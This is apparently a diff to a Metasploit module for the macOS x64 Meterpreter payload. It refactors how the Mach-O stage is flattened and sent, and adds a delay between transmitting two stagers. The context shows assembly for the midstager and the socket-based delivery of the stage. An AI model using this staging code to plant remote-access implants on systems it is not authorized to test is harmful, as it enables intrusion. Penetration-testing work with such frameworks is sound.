@@ -1,12 +1,12 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/base/sessions/meterpreter_x64_osx'
 require 'msf/base/sessions/meterpreter_options'
 require 'msf/base/sessions/mettle_config'
-require 'macho'
+require 'msf/core/payload/macho'
 
 module MetasploitModule
   include Msf::Sessions::MeterpreterOptions
@@ -37,24 +37,9 @@ module MetasploitModule
   def handle_intermediate_stage(conn, payload)
     stager_file = File.join(Msf::Config.data_directory, "meterpreter", "x64_osx_stage")
     data = File.binread(stager_file)
-    macho = MachO::MachOFile.new_from_bin(data)
-    main_func = macho[:LC_MAIN].first
-    entry_offset = main_func.entryoff
-
-    output_data = ''
-    for segment in macho.segments
-      for section in segment.sections
-        file_section = segment.fileoff + section.offset
-        vm_addr = section.addr - 0x100000000
-        section_data = data[file_section, section.size]
-        if output_data.size < vm_addr
-          output_data += "\x00" * (vm_addr - output_data.size)
-        end
-        if section_data
-          output_data[vm_addr, output_data.size] = section_data
-        end
-      end
-    end
+    macho = Msf::Payload::MachO.new(data)
+    output_data = macho.flatten
+    entry_offset = macho.entrypoint
 
     midstager_asm = %(
       push rdi                    ; save sockfd
@@ -130,8 +115,9 @@ module MetasploitModule
     )
     midstager = Metasm::Shellcode.assemble(Metasm::X64.new, midstager_asm).encode_string
     print_status("Transmitting first stager...(#{midstager.length} bytes)")
-
     conn.put(midstager) == midstager.length
+
+    Rex::sleep(0.1)
     print_status("Transmitting second stager...(#{output_data.length} bytes)")
     conn.put(output_data) == output_data.length
   end
